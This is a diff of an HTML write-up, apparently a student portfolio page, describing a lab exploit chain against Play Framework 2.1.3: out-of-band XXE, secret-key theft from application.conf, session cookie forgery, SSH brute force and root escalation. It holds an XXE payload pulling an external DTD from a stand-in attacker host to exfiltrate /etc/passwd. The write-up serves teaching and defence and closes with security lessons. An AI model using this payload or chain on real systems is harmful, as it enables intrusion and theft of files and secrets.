@@ -2,29 +2,24 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XXE & Cookie Forgery Tutorial | Marco Abreu</title>
+    <title>XXE & Cookie Forgery | Marco Abreu</title>
     <link rel="stylesheet" href="../style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
 
 <nav class="navbar">
     <div class="logo">&lt;MarcoAbreu /&gt;</div>
     <ul class="nav-links">
-        <li><a href="../index.html#about">About</a></li>
-        <li><a href="../index.html#skills">Skills</a></li>
-        <li><a href="../index.html#projects">Projects</a></li>
-        <li><a href="../index.html#writeups">Write-Ups</a></li>
-        <li><a href="../index.html#contact">Contact</a></li>
+        <li><a href="../index.html#writeups">← Back to Write-Ups</a></li>
     </ul>
 </nav>
 
 <header class="hero">
     <div class="container">
-        <h1>XXE & Cookie Forgery Tutorial</h1>
+        <h1>XXE & Cookie Forgery on Play Framework</h1>
         <p class="subtitle">
-            A practical step-by-step guide to exploiting XML External Entity vulnerabilities and Play Framework session cookies.
+            End-to-end exploitation of a vulnerable Play Framework 2.1.3 application,
+            combining XXE Out-of-Band attacks, secret disclosure, and session forgery.
         </p>
         <a href="#tutorial" class="btn">Read Tutorial</a>
     </div>
@@ -32,60 +27,205 @@
 
 <section id="tutorial" class="section">
     <div class="container">
-        <h2 class="section-title">Tutorial Overview</h2>
+
+        <!-- Overview -->
+        <h2 class="section-title">Overview</h2>
         <p>
-            This tutorial demonstrates how to exploit a vulnerable Play Framework web server (version 2.1.3) using an XXE (XML External Entity) attack and cookie forgery. The goal is to gain administrator access on the web application and understand the full attack workflow, from reconnaissance to post-exploitation.
+            This write-up documents a full web exploitation chain performed in a controlled
+            academic environment. The target application was developed using
+            <strong>Play Framework 2.1.3</strong>, an outdated version affected by multiple
+            security flaws.
+        </p>
+        <p>
+            The attack combines an <strong>XML External Entity (XXE)</strong> vulnerability
+            (CVE-2014-3630) with weaknesses in Play Framework’s
+            <strong>stateless session cookie mechanism</strong>, ultimately leading to
+            administrator impersonation and full system compromise.
         </p>
 
-        <h3>Scenario</h3>
-        <p>
-            The target is a web server running on a virtual machine with Play Framework 2.1.3, which provides login functionality via JSON requests. Although the requests are in JSON, the server still processes XML internally, allowing XXE exploitation. The attacker machine runs Kali Linux and hosts a malicious DTD file for Out-of-Band (OOB) data exfiltration.
-        </p>
-
-        <h3>Vulnerability Explored</h3>
-        <p>
-            The server is vulnerable to CVE-2014-3630, an XXE vulnerability. This allows external entities to be included in XML processing, potentially exposing sensitive information such as `/etc/passwd` and session secrets. Additionally, the Play Framework uses stateless session cookies signed with a secret key, which can be manipulated to gain admin access.
-        </p>
-
-        <h3>Attack Phases</h3>
-        <h4>1. Reconnaissance</h4>
+        <!-- Target Environment -->
+        <h2 class="section-title">Target Environment</h2>
         <ul>
-            <li>Used <strong>Nmap</strong> to identify open ports (22 SSH, 80 HTTP, 3306 MySQL).</li>
-            <li>Used <strong>dirb</strong> to enumerate directories, identifying the login page.</li>
+            <li><strong>Framework:</strong> Play Framework 2.1.3</li>
+            <li><strong>Architecture:</strong> MVC (Model-View-Controller)</li>
+            <li><strong>Server OS:</strong> Linux (VirtualBox VM)</li>
+            <li><strong>Attacker OS:</strong> Kali Linux</li>
+            <li><strong>Vulnerabilities:</strong> XXE (OOB) + Session Cookie Forgery</li>
         </ul>
 
-        <h4>2. Exploitation</h4>
-        <ol>
-            <li>Captured a login request using <strong>FoxyProxy</strong> + <strong>Burp Suite</strong>.</li>
-            <li>Modified the request to XML format and sent it to the server, confirming it processes XML.</li>
-            <li>Performed an <strong>Out-of-Band XXE attack</strong> using a malicious DTD hosted on the attacker server. This retrieved sensitive files like `/etc/passwd` and `application.conf`.</li>
-            <li>Extracted the session cookie secret from `application.conf` and recreated the cookie using a Python script that mimics the Play Framework `Sign` function.</li>
-            <li>Injected the forged cookie into the browser, gaining administrator access to the web application.</li>
-        </ol>
+        <figure>
+            <img src="images/image1.png" alt="Vulnerable web server VM">
+            <figcaption>Figure 1 – Vulnerable Play Framework web server</figcaption>
+        </figure>
 
-        <h4>3. Post-Exploitation</h4>
-        <ul>
-            <li>Used the information from `/etc/passwd` and Metasploit to brute-force SSH login.</li>
-            <li>Successfully logged in as user `pentesterlab` and escalated privileges to root using `sudo su`.</li>
-        </ul>
+        <figure>
+            <img src="images/image2.png" alt="Attacker Kali Linux VM">
+            <figcaption>Figure 2 – Attacker machine (Kali Linux)</figcaption>
+        </figure>
 
-        <h3>Tools Used</h3>
-        <ul>
-            <li><strong>Nmap:</strong> network scanning and service enumeration.</li>
-            <li><strong>dirb:</strong> directory and file discovery.</li>
-            <li><strong>FoxyProxy:</strong> browser proxy management.</li>
-            <li><strong>Burp Suite:</strong> request interception, modification, and attack injection.</li>
-            <li><strong>Python http.server:</strong> hosting the malicious DTD file.</li>
-            <li><strong>Netcat (nc):</strong> OOB exfiltration and listening for data.</li>
-            <li><strong>URLDecoder:</strong> decoding server responses.</li>
-            <li><strong>Storage Inspector (Firefox):</strong> viewing and editing session cookies.</li>
-            <li><strong>Metasploit:</strong> brute-force SSH attack with `rockyou.txt`.</li>
-        </ul>
-
-        <h3>Conclusion</h3>
+        <!-- Vulnerability -->
+        <h2 class="section-title">Vulnerability Description</h2>
         <p>
-            This tutorial demonstrates the importance of maintaining up-to-date software and secure default configurations. Vulnerabilities like XXE can expose sensitive data and session secrets, allowing attackers to gain admin access. Understanding attack methodologies and post-exploitation techniques helps strengthen security awareness and proactive defense strategies.
+            Although the web application communicates with the backend using JSON,
+            the server-side endpoint still processes XML requests. The XML parser
+            used by Play Framework 2.1.3 does not fully disable external entity
+            resolution, making it vulnerable to XXE attacks.
         </p>
+        <p>
+            While in-band XXE responses are restricted, the parser allows
+            <strong>external DTD resolution</strong>, enabling an
+            <strong>Out-of-Band (OOB)</strong> XXE attack to exfiltrate sensitive files.
+        </p>
+
+        <figure>
+            <img src="images/image3.png" alt="Original HTTP request">
+            <figcaption>Figure 3 – Original request between client and server</figcaption>
+        </figure>
+
+        <!-- Attack Phases -->
+        <h2 class="section-title">Attack Phases</h2>
+
+        <!-- Recon -->
+        <h3>1. Reconnaissance</h3>
+        <p>
+            The attack began with network reconnaissance using <strong>Nmap</strong>
+            to identify exposed services on the target host (192.168.1.177).
+        </p>
+
+        <pre><code>nmap -sC -sV 192.168.1.177</code></pre>
+
+        <p>
+            The scan revealed three open services:
+        </p>
+        <ul>
+            <li>TCP 22 – OpenSSH</li>
+            <li>TCP 80 – HTTP (Apache)</li>
+            <li>TCP 3306 – MySQL</li>
+        </ul>
+
+        <figure>
+            <img src="images/image4.png" alt="Nmap scan results">
+            <figcaption>Figure 4 – Nmap scan results</figcaption>
+        </figure>
+
+        <p>
+            Directory enumeration using <strong>dirb</strong> uncovered a login endpoint,
+            confirming the presence of authentication functionality.
+        </p>
+
+        <!-- Exploitation -->
+        <h3>2. XXE Exploitation (Out-of-Band)</h3>
+        <p>
+            A valid login request was intercepted using <strong>FoxyProxy</strong> and
+            <strong>Burp Suite</strong>. The request was modified to:
+        </p>
+        <ul>
+            <li>Change the Content-Type to <code>text/xml</code></li>
+            <li>Inject a malicious XML payload</li>
+        </ul>
+
+        <pre><code>&lt;!DOCTYPE data [
+  &lt;!ENTITY % ext SYSTEM "http://attacker-ip:3000/evil.dtd"&gt;
+  %ext;
+]&gt;
+&lt;data&gt;test&lt;/data&gt;
+</code></pre>
+
+        <p>
+            A malicious external DTD hosted on the attacker machine instructed the
+            server to read local files and exfiltrate them via HTTP requests.
+        </p>
+
+        <figure>
+            <img src="images/image5.png" alt="External DTD">
+            <figcaption>Figure 5 – External DTD hosted by the attacker</figcaption>
+        </figure>
+
+        <p>
+            Using this technique, sensitive files such as <code>/etc/passwd</code> were
+            successfully extracted.
+        </p>
+
+        <figure>
+            <img src="images/image6.png" alt="Extracted /etc/passwd">
+            <figcaption>Figure 6 – Exfiltrated /etc/passwd file</figcaption>
+        </figure>
+
+        <!-- Cookie Forgery -->
+        <h3>3. Play Framework Session Cookie Forgery</h3>
+        <p>
+            Analysis of <code>/etc/passwd</code> revealed a <code>play</code> user and
+            installation directory. Further XXE exploitation allowed access to:
+        </p>
+
+        <pre><code>/opt/play-2.1.3/conf/application.conf</code></pre>
+
+        <p>
+            This configuration file contained the <strong>Play secret key</strong>,
+            used to cryptographically sign session cookies.
+        </p>
+
+        <figure>
+            <img src="images/image7.png" alt="Application.conf secret">
+            <figcaption>Figure 7 – Secret key extracted from application.conf</figcaption>
+        </figure>
+
+        <p>
+            By reviewing Play Framework source code, the session encoding and signing
+            process was replicated in Python, allowing the creation of a valid
+            administrator session cookie.
+        </p>
+
+        <figure>
+            <img src="images/image8.png" alt="Forged cookie in browser">
+            <figcaption>Figure 8 – Forged PLAY_SESSION cookie</figcaption>
+        </figure>
+
+        <p>
+            Once injected into the browser, the application immediately recognized
+            the session as an authenticated administrator.
+        </p>
+
+        <!-- Post Exploitation -->
+        <h3>4. Post-Exploitation</h3>
+        <p>
+            With system user information obtained earlier, a brute-force attack
+            against SSH was performed using <strong>Metasploit</strong>.
+        </p>
+
+        <figure>
+            <img src="images/image9.png" alt="Metasploit SSH brute force">
+            <figcaption>Figure 9 – Successful SSH brute-force attack</figcaption>
+        </figure>
+
+        <p>
+            Access was gained as the <code>pentesterlab</code> user. Since this user
+            had sudo privileges, privilege escalation to root was trivial.
+        </p>
+
+        <pre><code>sudo su</code></pre>
+
+        <!-- Tools -->
+        <h2 class="section-title">Tools Used</h2>
+        <ul>
+            <li>Nmap – Network reconnaissance</li>
+            <li>dirb – Directory enumeration</li>
+            <li>FoxyProxy – Proxy redirection</li>
+            <li>Burp Suite – Request interception and modification</li>
+            <li>Python http.server – Hosting malicious DTD</li>
+            <li>Netcat – OOB data capture</li>
+            <li>Metasploit – SSH brute force</li>
+        </ul>
+
+        <!-- Lessons -->
+        <h2 class="section-title">Security Lessons</h2>
+        <ul>
+            <li>Always disable external entity resolution in XML parsers</li>
+            <li>Never rely on client-side session storage for sensitive state</li>
+            <li>Protect cryptographic secrets with strict file permissions</li>
+            <li>Keep frameworks and dependencies updated</li>
+        </ul>
+
     </div>
 </section>
 
